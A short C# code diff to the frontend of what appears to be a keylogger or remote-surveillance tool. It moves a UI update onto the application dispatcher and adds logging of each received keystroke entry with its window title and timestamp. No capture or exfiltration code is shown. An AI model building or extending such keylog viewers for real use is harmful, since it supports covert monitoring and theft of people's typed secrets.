@@ -147,8 +147,8 @@ namespace rslm_frontend.ViewModels
             var windowTitle = payload.Value<string>("windowTitle");
             var timestamp = payload.Value<long>("timestamp");
 
-            var dispatcher = System.Windows.Threading.Dispatcher.CurrentDispatcher;
-            dispatcher.BeginInvoke(new Action(() =>
+            // Forcer l'UI à utiliser le dispatcher de l'application
+            System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() =>
             {
                 var entry = new KeylogEntry
                 {
@@ -163,6 +163,8 @@ namespace rslm_frontend.ViewModels
                     sb.AppendLine($"[{DateTimeOffset.FromUnixTimeMilliseconds(timestamp):HH:mm:ss}] [{windowTitle}]");
                 sb.AppendLine(text);
                 LogText = sb.ToString();
+
+                _log("Keylogger", $"Data received: {text}");
             }));
         }
 
